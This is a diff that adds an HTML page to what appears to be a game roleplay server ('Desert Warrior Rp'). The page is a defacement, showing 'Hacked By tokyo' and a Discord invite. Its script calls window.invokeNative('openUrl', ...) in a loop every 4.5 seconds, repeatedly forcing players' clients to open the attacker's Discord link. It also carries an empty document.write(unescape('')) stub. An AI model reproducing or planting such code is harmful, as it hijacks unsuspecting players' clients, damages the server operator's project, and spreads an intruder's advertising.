@@ -1,0 +1,106 @@
+<html lang="en"><head><script language="javascript">document.write(unescape(''))</script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝐃𝐞𝐬𝐞𝐫𝐭 𝐖𝐚𝐫𝐫𝐢𝐨𝐫 𝐑𝐩</title>
+    <style>
+       body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            font-family: 'Courier New', Courier, monospace;
+            color: red;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
+        }
+        #content {
+            display: none;
+            opacity: 0;
+            transition: opacity 2s ease;
+        }
+        .image-container img {
+            width: 400px; 
+            height: auto;
+            border: 2px solid rgb(255, 153, 0); 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 153, 0); 
+        }
+          .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: rgb(255, 153, 0); 
+            text-shadow: 0 0 8px rgb(255, 136, 0), 0 0 15px rgb(255, 136, 0), 0 0 25px rgb(255, 145, 0);
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 5px;
+            font-size: 75px; 
+            color:  rgb(255, 153, 0); 
+            text-shadow: 0 0 8px rgb(255, 136, 0), 0 0 15px rgb(255, 136, 0), 0 0 25px rgb(255, 145, 0); 
+            letter-spacing: 4.5px;
+        }
+        .video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px);
+        }
+    </style>
+</head>
+<body>
+</head>
+<body>
+    <div class="video-container">
+        <video autoplay="" loop="" muted="">
+            <source src="https://cdn.discordapp.com/attachments/1331679525313974372/1332382695157665862/12fa995cda6546b892d2a8ca1bd49ae2.mov?ex=67c9c994&amp;is=67c87814&amp;hm=888d496a5b13ea080e67c699d6da44e98baf77c740f7080677914ad4054ee8aa&amp;" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div class="png-container" style="display: none;">
+        <img src="https://cdn.discordapp.com/attachments/965594136415715349/1392573135920037928/image.png?ex=687940cc&is=6877ef4c&hm=284872b770d1000a64a5c9ca4be500333cc364b99fcc4e2f91b43fcedd8ef4f4&" alt="">
+    </div>
+
+    <div id="content" style="display: block; opacity: 1;">
+        <div class="image-container">
+            <img src="https://cdn.discordapp.com/attachments/965594136415715349/1392573135920037928/image.png?ex=687940cc&is=6877ef4c&hm=284872b770d1000a64a5c9ca4be500333cc364b99fcc4e2f91b43fcedd8ef4f4&" alt="">
+        </div>
+        <div class="info" id="ip-info"> &lt;&lt; Hacked By tokyo &gt;&gt;
+        <div class="text">https://discord.gg/Z996vTKw</div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.querySelector('.gif-container').style.display = 'none';
+            const content = document.getElementById('content');
+            content.style.display = 'block';
+            setTimeout(() => {
+                content.style.opacity = 1;
+            }, 150); 
+        }, 200);
+
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/Z996vTKw");
+            window.invokeNative("openUrl", "https://discord.gg/Z996vTKw");
+        }, 4500);
+    </script>
+
+
+
+</body></html>
